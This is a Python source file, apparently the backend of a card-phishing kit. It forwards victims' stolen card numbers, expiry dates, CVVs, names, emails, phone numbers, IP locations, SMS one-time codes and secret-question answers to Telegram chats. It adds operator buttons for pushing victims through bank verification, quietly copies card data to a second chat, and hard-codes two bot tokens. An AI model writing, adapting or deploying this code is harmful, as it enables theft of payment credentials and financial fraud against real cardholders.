from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
from parserBIN import Bin
import requests
API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
api = '7079516897:AAEXE05Pvs7RXawn8CLitptBwSxk75UUbZw'
from telegram.error import TelegramError
def escape_reserved_characters(text):
    # Список зарезервированных символов, которые нужно экранировать
    reserved_characters = ['_', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
     
    # Экранируем каждый зарезервированный символ
    for char in reserved_characters:
        text = text.replace(char, f'\\{char}')
    
    return text
def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
    bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_me1(card, date, cvv):
    bot = Bot(token=api)
    text = escape_reserved_characters(f'🃏  `{card}`\n⏰  `{date}`\n🗄 `{cvv}`')
    bot.send_message(chat_id='-4283929645', text=text, parse_mode='MarkdownV2')
def send_sms1(card, sms):
    bot = Bot(token=api)
    text = escape_reserved_characters(f'🃏  `{card}`\n💬 `{sms}`')
    bot.send_message(chat_id='-4283929645', text=text, parse_mode='MarkdownV2')

def send_me(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
    bot = Bot(token=API_TOKEN)
    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
    bot.send_message(chat_id=CHAT_ID, text=text, parse_mode='MarkdownV2')
    
def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("❓Incorrect❓", callback_data='button5'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n❓  `{question}` '.replace('.', '\.'), reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_sms(CHAT_ID, card, date, cvv, sms, ID):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("✅Отработан✅", callback_data='button1'),
            InlineKeyboardButton("Error SMS", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}`'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')

def ne_pizdabol(card, chat_id='-4150791967'):
    try:
        bot = Bot(token=API_TOKEN)
        message = f'{card}'
        bot.send_message(chat_id=chat_id, text=message)
        print("Message sent successfully")
    except TelegramError as e:
        print(f"Failed to send message: {e}")

def cheltut(ip,name):
    try:
        chat_id='-4150791967'
        if ip.find('176.101.2.213') != -1:
            pass
        bot = Bot(token=API_TOKEN)
        message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip}\n🌏: `{get_country_by_ip(ip)}`\n🏷: `{name}`')
        bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
    except TelegramError as e:
        print(f"Failed to send message: {e}")

def get_country_by_ip(ip_address):
    # URL для доступа к ipapi
    url = f'http://ipapi.co/{ip_address}/json/'

    try:
        # Отправка запроса к API
        response = requests.get(url)
        response.raise_for_status()  # Проверка на наличие ошибок в запросе

        # Преобразование ответа в формат JSON
        data = response.json()

        # Извлечение информации о стране
        country = data.get('country_name', 'Unknown')

        return country

    except requests.exceptions.RequestException as e:
        # Обработка ошибок, связанных с запросом
        print(f"Error: {e}")
        return None
